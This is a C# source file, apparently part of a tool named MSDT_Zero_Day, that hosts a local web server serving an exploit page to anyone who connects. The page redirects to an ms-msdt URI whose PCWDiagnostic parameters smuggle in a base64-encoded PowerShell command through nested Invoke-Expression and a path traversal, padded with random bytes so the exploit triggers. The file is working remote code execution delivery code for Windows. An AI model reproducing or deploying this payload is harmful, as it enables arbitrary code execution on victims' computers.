using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net;
using System.Net.Http;

namespace MSDT_Zero_Day
{
    public class HttpServer
    {
		private static Random rnd = new Random();

		public static string RandomString(int length)
		{
			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			return new string(Enumerable.Repeat(chars, length)
				.Select(s => s[rnd.Next(s.Length)]).ToArray());
		}

		public static void StartServer(int port, string command)
        {
			var listener = new System.Net.Http.HttpListener(IPAddress.Parse("127.0.0.1"), port);
			try
			{
				listener.Request += async (sender, context) =>
				{
                    BetterConsole.WriteLine("Connection recieved!");
					var request = context.Request;
					var response = context.Response;
					if (request.HttpMethod == HttpMethods.Get)
					{
                        BetterConsole.WriteLine("Serving malicious script...");
						string base64_payload = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));
						var html_payload = "<script>location.href = \"ms-msdt:/id PCWDiagnostic /skip force /param \\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'" + base64_payload + "'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\"\";";
						html_payload += " //" + RandomString(4096).ToLower(); // minimum requirement of bytes for exploit to work.
						html_payload += "\n</script>";

						await response.WriteContentAsync(html_payload);
					}
					else
					{
						response.MethodNotAllowed();
					}
					// Close the HttpResponse to send it back to the client.
					response.Close();
				};
				listener.Start();

				BetterConsole.WritePlus($"Now hosting server on: 127.0.0.1:{port}");
				BetterConsole.WriteLine($"Press any key to stop the server...");
				Console.ReadKey();
			}
			catch (Exception exc)
			{
				Console.WriteLine(exc.ToString());
			}
			finally
			{
				listener.Close();
			}
		}
    }
}